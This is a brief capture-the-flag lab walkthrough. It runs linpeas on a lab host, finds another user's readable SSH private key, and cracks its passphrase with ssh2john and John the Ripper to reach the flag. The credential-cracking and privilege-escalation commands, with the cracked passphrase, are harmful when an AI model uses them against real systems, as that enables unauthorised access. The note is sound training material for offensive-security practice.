	use linpeas to find any exploit vector: 
		wget https://github.com/carlospolop/PEASS-ng/releases/download/20220626/linpeas.sh
	we can scp the linpeas script to the victim pc (/tmp) cuz we already hav jan ssh password
		scp linpeas.sh jan@10.10.217.148:/tmp
	make it 600:
		chmod 600 linpeas.sh
	run:
		./linpeas.sh
	now we find kay has id_rsa (private_key) that is available for read
#connect-ssh
	now we try to connect to kay using the private_key but it requires a passphrase, so this way we can use johntheripper to crack the passphrase
		1. save private_key into a text file that john can understand
			ssh2john /home/aries/Desktop/pentestprivkey > johnpentest.txt
		2. use john to crack with the rockyou.txt wordlist
			john johnpentest.txt --wordlist=/usr/share/wordlists/rockyou.txt
		Passphrase: beeswax
	With this passphrase, we are able to login to kay ssh and view the pass.bak file that contains the flag
